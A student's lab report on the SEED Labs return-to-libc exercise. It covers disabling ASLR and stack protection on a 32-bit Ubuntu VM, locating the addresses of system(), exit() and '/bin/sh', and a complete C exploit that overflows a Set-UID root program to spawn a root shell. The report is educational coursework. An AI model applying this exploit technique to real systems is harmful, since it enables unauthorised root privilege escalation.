# Return-to-libc Attack Lab

**Author:** Guilherme de Abreu Barreto

## Overview

A return-to-libc attack bypasses the non-executable stack protection by
hijacking the return address to jump into existing libc functions (like
`system()`) rather than injecting shellcode. This report documents the steps
taken to exploit a buffer overflow in a Set-UID root program and obtain a root
shell.

---

## Step 0a: Host Environment Setup

The host machine runs **NixOS** with **VirtualBox** enabled as a host via:

```nix
virtualisation.virtualbox.host = {
  enable = true;
  enableKvm = true;
  addNetworkInterface = false;
};
```

The **SEED Labs Ubuntu 16.04 32-bit** virtual machine is managed through a
[`devenv`](https://devenv.sh) environment defined in this directory:

- `devenv.yaml` — Pins `nixpkgs` to `nixos-25.11`
- `devenv.nix` — Defines scripts to download, import, and launch the VM
- `devenv.lock` — Locks the dependency revisions

From within the `devenv` shell, the VM is started with:

```bash
seed-vm-start
```

This downloads the official SEED Labs VM image from DigitalOcean Spaces (if not
cached), registers it in VirtualBox, and boots it.

A **shared folder** (`return-to-libc/shared/`) was set up via the VirtualBox GUI
to transfer files between the host and the VM. It is mounted read-only inside
the guest at `/media/sf_return-to-libc`. C source files (`retlib.c`,
`exploit.c`) are written on the host and compiled inside the VM after copying.

---

## Step 0b: Lab Setup — Disabling OS Countermeasures

Ubuntu enables several protections by default. I disabled them to make the
attack feasible:

1. **ASLR** (`sudo sysctl -w kernel.randomize_va_space=0`) — Randomizes where
   libraries load in memory. With it on, addresses change every run, making
   hardcoded addresses useless. Verify with
   `cat /proc/sys/kernel/randomize_va_space` → must show `0`.

2. **StackGuard** (`-fno-stack-protector`) — GCC inserts a canary value between
   the buffer and the return address. If overwritten, the program aborts. I
   disabled it at compile time.

3. **Non-executable stack** (`-z noexecstack`) — This is the protection I'm
   proving insufficient. Traditional attacks inject shellcode on the stack and
   jump to it. Return-to-libc doesn't need executable stack space — it jumps to
   existing libc code.

4. **Set-UID** (`sudo chown root retlib && sudo chmod 4755 retlib`) — Makes the
   program run with root privileges. The `4` in `4755` sets the Set-UID bit.
   Order matters: `chown` clears the Set-UID bit, so `chmod` must come after.

5. **Shell symlink** (`sudo ln -sf /bin/zsh /bin/sh`) — Ubuntu 16.04's `dash`
   drops privileges in Set-UID processes. I relinked to `zsh` which doesn't.

No Buffer size was stipulated for this activity, so I've picked a number of
random with:

```bash
echo $((RANDOM % 201))
```

Which returned `138` and was rounded to `128`, the nearest exponent of `2`. I
proceeded to compile `retlib.c` setting its `-DBUF_SIZE` flag:

```bash
gcc -DBUF_SIZE=128 -fno-stack-protector -z noexecstack -o retlib /media/sf_return-to-libc/retlib.c
sudo chown root retlib
sudo chmod 4755 retlib
```

---

## Step 1: Finding libc Function Addresses (Task 1)

I needed the runtime addresses of `system()`, `exit()`, and `"/bin/sh"` inside
the target process.

**Approach taken:** Used GDB without PEDA (`gdb -nx -q`) to avoid plugin
interference:

```bash
touch badfile                          # retlib needs this file to exist
gdb -nx -q ./retlib
(gdb) b main
(gdb) run
(gdb) p system                         # address of system()
(gdb) p exit                           # address of exit()
(gdb) find &system, +9999999, "/bin/sh" # address of "/bin/sh" string in libc
```

**Key findings:**

- `system()`: `0xb7e42da0`
- `exit()`: `0xb7e369d0`
- `"/bin/sh"`: `0xb7f6382b`

> [!IMPORTANT]
>
> As I came to discover, GDB adds its own environment variables, shifting the
> libc base by ~0x9e000 compared to standalone execution. This is the reason I
> tried using `ldd` later for this same purpose.

---

## Step 2: Understanding the Stack Layout (Disassembly)

With BUF_SIZE=128, I examined the disassembly of `bof()`:

```asm
0x080484eb <+0>:   push   ebp
0x080484ec <+1>:   mov    ebp,esp
0x080484ee <+3>:   sub    esp,0x88       # allocates 136 bytes
...
0x080484fe <+19>:  lea    eax,[ebp-0x88] # buffer at ebp-136
...
0x08048512 <+39>:  leave
0x08048513 <+40>:  ret
```

This reveals the stack layout:

| Offset from buffer | Content                                          |
| ------------------ | ------------------------------------------------ |
| 0–127              | `buffer[0..127]` (128 bytes)                     |
| 128–135            | compiler padding (8 bytes)                       |
| 136–139            | saved EBP (4 bytes)                              |
| **140–143**        | **return address** ← overwritten with `system()` |
| **144–147**        | **system()'s return address** ← set to `exit()`  |
| **148–151**        | **system()'s argument** ← pointer to `"/bin/sh"` |

---

## Step 3: Building the Exploit (Task 3)

### Finding the runtime libc base with `ldd`

[`ldd`](https://man.archlinux.org/man/ldd.1) (**list dynamic dependencies**)
prints which shared libraries a program loads and at which addresses. I ran it
to find where libc loads when `retlib` runs standalone:

```bash
$ ldd ./retlib
...
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7d8e000)
```

This told me libc was at `0xb7d8e000`. From here I needed the offsets of
`system()`, `exit()`, and the string `"/bin/sh"` within libc.

### Finding symbol offsets with `readelf` and `strings`

To get the distance between a function and the start of libc, I queried the
library's symbol table with
[`readelf`](https://man.archlinux.org/man/readelf.1):

```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -w system    # → 0x3ada0
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -w exit      # → 0x2e9d0
```

The string `"/bin/sh"` is not a named symbol — it lives in the read-only data
section of libc. I located it by scanning the raw file with
[`strings`](https://man.archlinux.org/man/strings.1):

```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"  # → 0x15b82b
```

I then computed my three target addresses by adding these offsets to the
`ldd`-reported libc base (`0xb7d8e000`).

> [!IMPORTANT] Why I searched inside libc instead of using an env variable
>
> The textbook suggests placing `"/bin/sh"` in an environment variable
> (`MYSHELL=/bin/sh`) and finding its address with a helper program
> (`getenvaddr.c`). The problem is that the address of an environment variable
> shifts depending on the program's name, argument count, environment size, and
> even whether the program runs inside or outside GDB. Using the `"/bin/sh"`
> string that already exists inside libc eliminates this variability — all three
> addresses live in the same library and shift together.

### The address problem

The computed addresses from `ldd` did not match the actual runtime addresses.
`dmesg` output confirmed this: `ldd` reports a different libc base
(`0xb7d8e000`) than the one used at runtime (`0xb7e08000`).

```bash
$ dmesg | tail -5
...
retlib[3463]: segfault at b7dc8da0 ip b7dc8da0 ... in libc-2.23.so[b7e08000+1af000]
```

The CPU jumped to my computed address for `system()`, which was wrong because
`ldd`-based computation was off. The real libc base at runtime was `0xb7e08000`.

**Solution:** Add the offsets obtained previously with the newly discovered base
address.

| Function/String | Address      |
| --------------- | ------------ |
| `system()`      | `0xb7e42da0` |
| `exit()`        | `0xb7e369d0` |
| `"/bin/sh"`     | `0xb7f5d82b` |

### Final exploit (exploit.c)

```c
#include <stdint.h>
#include <stdio.h>

#ifndef BUF_SIZE
#define BUF_SIZE 128
#endif
#define WORDSIZE 4
typedef uint32_t addr_t;

int main(int argc, char **argv)
{
    char buf[BUF_SIZE + 6 * WORDSIZE] = {0};
    FILE *badfile = fopen("./badfile", "w");
    int offset = BUF_SIZE + 3 * WORDSIZE;  // = 140

    addr_t system_addr = 0xb7e42da0;
    addr_t exit_addr   = 0xb7e369d0;
    addr_t sh_addr     = 0xb7f5d82b;

    *(addr_t *)&buf[offset]                = system_addr;  // return address
    *(addr_t *)&buf[offset + 1 * WORDSIZE] = exit_addr;    // system's return addr
    *(addr_t *)&buf[offset + 2 * WORDSIZE] = sh_addr;      // system's argument

    fwrite(buf, sizeof(buf), 1, badfile);
    fclose(badfile);
    return 0;
}
```

### Exploit verification in GDB

Set a breakpoint at `bof+40` (the `ret` instruction) and inspected the stack:

```
(gdb) b *bof+40
(gdb) run
(gdb) x/3xw $esp
0xbfffeabc:  0xb7e42da0  0xb7e369d0  0xb7f5d82b
```

All three addresses confirmed at the correct positions on the stack.

---

## Results

Running `./retlib` with the crafted `badfile` spawns a root shell. The attack
succeeds because:

1. `bof()` reads 300 bytes into a 128-byte buffer, overflowing past it
2. The overflow overwrites the return address with `system()`
3. When `bof()` executes `ret`, it jumps to `system("/bin/sh")`
4. Since `retlib` is Set-UID root, the shell runs with root privileges

---

## Key Lessons

1. **Non-executable stack is not sufficient protection.** Return-to-libc
   bypasses it by jumping to existing code (libc functions) rather than
   injecting new code on the stack.

2. **Environment variables shift stack addresses.** Using libc's built-in
   `"/bin/sh"` string avoids the address variability of the environment variable
   approach.

3. **`ldd` and `gdb` are unreliable for obtaining runtime addresses**, at least
   in their default configurations, due to the environmental differences.

4. **Compiler padding matters.** The disassembly revealed 8 bytes of alignment
   padding between `buffer` and the saved EBP — without checking, my offset
   calculations would have been wrong.

---

## Files

- `devenv.nix` / `devenv.yaml` / `devenv.lock` — devenv environment
  configuration
- `shared/` — Files transferred to the VM via the VirtualBox shared folder
  - `shared/retlib.c` — Vulnerable Set-UID program (BUF_SIZE=128)
  - `shared/exploit.c` — C exploit program
- `README.md` — This report

## Use of Artificial Inteligence

The following models were used as assistants in this experiment:

- **GLM 5.1** for coding assistance.
- **Deepseek V4 Flash** for writing assistance.

These are both Free and Open Source models licensed under the MIT License.
